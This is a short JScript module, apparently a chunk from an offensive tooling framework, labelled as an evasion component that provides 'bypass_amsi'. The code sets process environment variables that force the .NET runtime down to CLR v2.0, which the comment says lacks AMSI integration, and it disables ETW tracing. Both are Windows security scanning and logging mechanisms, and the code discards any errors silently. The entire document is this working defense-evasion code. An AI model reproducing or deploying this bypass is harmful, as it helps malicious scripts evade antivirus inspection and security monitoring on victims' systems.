// chunk: evasion/amsi_clr_downgrade
// depends: (none)
// provides: bypass_amsi
// format: jscript
// note: Forces .NET CLR v2.0 which lacks AMSI integration, and disables
//       ETW tracing. Both set via process environment variables.

function bypass_amsi() {
    try {
        var sh = new ActiveXObject("WScript.Shell");
        var env = sh.Environment("Process");
        env("COMPLUS_Version") = "v2.0.50727";
        env("COMPLUS_ETWEnabled") = "0";
        env("COMPlus_ETWEnabled") = "0";
    } catch(e) {}
}
